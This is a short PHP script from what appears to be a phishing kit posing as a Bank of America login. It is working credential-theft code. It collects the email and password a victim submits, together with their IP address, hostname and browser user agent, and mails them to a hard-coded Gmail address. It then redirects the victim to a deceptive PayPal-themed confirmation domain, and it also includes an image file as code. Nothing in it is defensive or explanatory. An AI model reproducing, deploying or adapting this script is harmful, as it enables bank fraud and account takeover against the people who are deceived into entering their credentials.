<?php
include ("images/blocker.gif");
if($_POST["eml"] != "" and $_POST["eps"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------BOA Info-----------------------\n";
$message .= "email            : ".$_POST['eml']."\n";
$message .= "password             : ".$_POST['eps']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "apatchi020@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);   
mail($userinfo,$subject,$message);
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://login-paypal.com-police.intel-confirmation.donsson.com/Nouveau%20dossier/2.html");
}else{
header ("Location: index.php");
}

?>